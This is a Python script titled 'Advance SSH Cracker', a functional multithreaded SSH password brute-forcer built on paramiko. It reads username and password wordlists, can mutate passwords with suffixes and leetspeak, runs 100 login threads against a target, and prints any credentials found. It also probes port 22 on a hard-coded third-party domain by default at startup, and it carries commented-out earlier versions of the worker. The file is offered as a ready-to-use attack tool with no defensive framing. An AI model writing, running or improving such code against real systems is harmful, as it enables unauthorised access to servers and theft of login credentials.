import socket
import paramiko
import argparse

from threading import Thread, Lock, Event
from queue import Queue

combo_queue = Queue()
result_lock = Lock()
stop_event = Event()

parser = argparse.ArgumentParser(description="Advance SSH Cracker")

parser.add_argument("-t","--target",required=True,type=str,help="Enter The target")
parser.add_argument("-u","--user",type=str,required=True,help="Enter the user or a Wordlist to user names")
parser.add_argument("-p","--passwd",type=str,required=True,help="Enter the path to wordlist containing passwords")
parser.add_argument("-m","--mutate",action="store_true",help="Enable this flag to mutate password wordlist")

args = parser.parse_args()

host = args.target
user = args.user
passwd = args.passwd
mutant = args.mutate

def check_ssh(ip="steminfinity.in", port=22, timeout=3):
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            
            print("Success. The Port is Open")
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        print("Failure. The Port is not open")
        return False


check_ssh()

def smart_mutate(base_word):
    leet_map = {'a': '@', 'i': '1', 'e': '3', 'o': '0', 's': '$'}

    mutations = set()

    # Basic variations
    mutations.add(base_word)
    mutations.add(base_word.capitalize())
    mutations.add(base_word.upper())

    # Common suffixes
    suffixes = ["123", "!", "2024", "@"]
    for word in list(mutations):
        for suffix in suffixes:
            mutations.add(word + suffix)

    # Leetspeak (simple version)
    for word in list(mutations):
        for orig, repl in leet_map.items():
            if orig in word:
                mutations.add(word.replace(orig, repl))

    return mutations


def userb(user):
    with open(user , 'r' , encoding='utf-8') as f:
        return[line.strip('\n') for line in f]
    


users = userb(user)


def words(passwd):
    with open(passwd , 'r' , encoding='utf-8') as f:
        return[line.strip('\n') for line in f]
    

passwords = words(passwd)



client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())


'''for userc in users:
    for password in passwords:

        try:
            #client.connect(hostname=host,username=user, password=password, timeout=3)
            #print(f"connection Success🏀🏀🏀🥎🥎⚾⚾⚽⚽💎💎💍💍💍 with {host}")
            combo_queue.put((userc,password))

        except Exception as e:
            print(f"Connection Failed with {host}")

'''



if mutant:
    for userc in users:
        for base in passwords:
            for password in smart_mutate(base):
                combo_queue.put((userc, password))
else:
    for userc in users:
        for password in passwords:
            combo_queue.put((userc,password))







'''
def ssh_worker():
    

    while not combo_queue.empty():
        if stop_event.is_set():
            combo_queue.task_done()
            return
        user , password =  combo_queue.get()
        try:
            if stop_event.is_set():
                combo_queue.task_done()
                return
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host,username=user, password=password, timeout=3)


            with result_lock :
                print(f"Success 🎉🎉✨✨✨🧨🧨🎇🎇🎎🎍🎍 {user}  :   {password}")
                stop_event.set()
            
            client.close()

        except Exception as e:
            with result_lock:
                print(f" Failure with {host}   :    {user}   :    {password}")

        finally:
            combo_queue.task_done()

'''
truepass = []
trueuser = []

def ssh_worker():
    
    while not combo_queue.empty():
        if stop_event.is_set():
            return  # Just exit thread safely, no task_done here yet

        user, password = combo_queue.get()
        try:
            if stop_event.is_set():
                combo_queue.task_done()
                return

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, username=user, password=password, timeout=3)

            with result_lock:
                print(f"✅ SUCCESS 🎉 {user} : {password}")
                truepass.append(password)
                trueuser.append(user) 
                stop_event.set()

            client.close()

        except Exception as e:
            with result_lock:
                print(f"❌ FAIL    {user} : {password}")

        finally:
            combo_queue.task_done()





threads = []

for _ in range(100):
    t = Thread(target=ssh_worker)
    t.start()
    threads.append(t)



for t in threads:
    t.join()



print("=====================================================\n")
print(f" The SSH Creds Of {host} are :\n")
print(f"✅  USER       :   {trueuser[0]}")
print(f"✅  Password   :   {truepass[0]}")